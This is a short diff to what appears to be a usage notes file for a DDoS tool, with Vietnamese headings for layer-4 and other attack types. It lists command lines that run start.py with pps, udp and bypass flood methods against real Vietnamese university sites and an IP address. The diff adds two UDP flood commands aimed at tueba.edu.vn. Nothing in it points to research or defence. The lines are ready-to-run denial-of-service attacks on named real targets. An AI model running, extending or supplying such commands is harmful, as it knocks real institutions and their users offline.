@@ -5,6 +5,8 @@ python3 start.py pps https://ictu.edu.vn/ 1 1000 0 100 100 --debug
 - Tấn công layer4:
 python3 start.py udp http://117.6.44.221/ 1000 25 100
 python3 start.py udp http://117.6.44.221/ 1 100 1
+python3 start.py udp https://tueba.edu.vn/ 1000 100 0
+python3 start.py udp https://tueba.edu.vn/ 1 100 0
 
 - Các kiểu tấn công khác:
 python3 start.py bypass http://tuyensinh.tueba.edu.vn/ 1 1000 0 100 100 --debug
